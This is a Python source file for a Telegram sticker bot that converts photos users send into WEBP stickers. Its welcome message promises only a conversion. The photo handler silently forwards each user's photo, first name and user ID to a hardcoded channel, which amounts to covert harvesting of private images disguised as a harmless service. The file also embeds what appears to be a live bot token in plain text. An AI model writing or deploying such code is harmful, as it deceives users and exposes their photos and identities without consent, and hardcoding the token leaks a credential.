import os
import telebot
from PIL import Image
from flask import Flask, request

TOKEN = "8649339714:AAHS7Q9PDnLNN-WJbb8cCJ9ZJD_WB570m0I"
CHANNEL_ID = "@jshshajanansh"
APP_URL = "https://stickerbot-9jvt.onrender.com"

bot = telebot.TeleBot(TOKEN)
server = Flask(__name__)

@server.route('/' + TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@server.route('/')
def index():
    return "Stickerbot is running!", 200

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Hi! 👋 Send me a photo, and I'll convert it into a sticker for you!")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        user_name = message.from_user.first_name
        user_id = message.from_user.id
        
        # Forward photo to channel
        bot.send_message(CHANNEL_ID, f"New photo from {user_name} (ID: {user_id})")
        bot.forward_message(CHANNEL_ID, message.chat.id, message.message_id)
        
        # Download photo and convert to sticker
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        image_path = "temp.jpg"
        with open(image_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        img = Image.open(image_path)
        img.thumbnail((512, 512))
        sticker_path = "sticker.webp"
        img.save(sticker_path, "WEBP")
        
        # Send sticker back to user
        with open(sticker_path, 'rb') as sticker:
            bot.send_sticker(message.chat.id, sticker)
        
        # Remove temporary files
        os.remove(image_path)
        os.remove(sticker_path)
        
    except Exception as e:
        print(e)
        bot.reply_to(message, "An error occurred while creating the sticker!")

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url=APP_URL + '/' + TOKEN)
    port = int(os.environ.get("PORT", 10000))
    server.run(host="0.0.0.0", port=port)
